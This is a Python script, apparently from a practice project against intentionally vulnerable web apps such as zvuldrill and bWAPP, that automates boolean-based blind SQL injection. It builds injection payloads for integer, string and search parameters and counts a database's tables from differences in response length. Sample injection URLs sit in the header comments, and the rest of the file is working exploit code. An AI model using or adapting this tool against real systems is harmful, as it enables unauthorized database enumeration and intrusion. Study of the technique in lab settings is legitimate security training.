# -*-coding:utf-8-*-

# select * from test1 where id=0 or if((select ascii(substr((select count(*) from information_schema.tables where table_schema=0x74657374),1,1)))>51,1,0)
# http://192.168.52.128/test2/zvuldrill-master/search.php?search=1%'+or if((select ascii(substr((select count(*) from information_schema.tables where table_schema=0x7A76756C6472696C6C),1,1)))=50,1,0)%23
# http://192.168.52.128/test2/zvuldrill-master/search.php?search=1%'+or if((select count(*) from information_schema.tables where table_schema=0x7A76756C6472696C6C)=3,1,0)%23
import urllib
from urllib import request
from data import glovar

def get_tbcount(url='http://192.168.52.128/test2/zvuldrill-master/search.php?search=1', cookie=False, type='search',
                dbname='zvuldrill'):
    response_length = 0

    hex_dbname = ""

    for i in dbname:
        hex_dbname += hex(ord(i))

    hex_dbname = '0x' + hex_dbname.replace('0x', '')

    # 查数据库test中表的个数基础知识--这里的方法只使用与表的个数少于10的，要是多多于10的话substr(({sql}),2,1)要这样增加截取，或者substr(({sql}),1,2)
    if type == 'int':
        payload = '+or+if((select+count(*)+from+information_schema.tables+where+table_schema=' + hex_dbname + ')={ascii_number},1,0)'
    elif type == 'string':
        payload = '\'+or+if((select+count(*)+from+information_schema.tables+where+table_schema=' + hex_dbname + ')={ascii_number},1,0)%23'
    elif type == 'search':
        payload = '%\'+or+if((select+count(*)+from+information_schema.tables+where+table_schema=' + hex_dbname + ')={ascii_number},1,0)%23'

    for i in range(0, 30):

        full_payload = url + payload.format(ascii_number=str(i))

        url_response = urllib.request.Request(full_payload)

        if (cookie != False):
            url_response.add_header('Cookie', cookie)

        url_read = request.urlopen(url_response).read()

        if response_length > len(url_read):
            print("table count is %d" % (i - 1))
            break

        response_length = len(url_read)


if __name__ == "__main__":

    get_tbcount(url=glovar.url3)

    #get_tbcount(url=glovar.url4, cookie=glovar.cookie, type='int', dbname='bwapp')
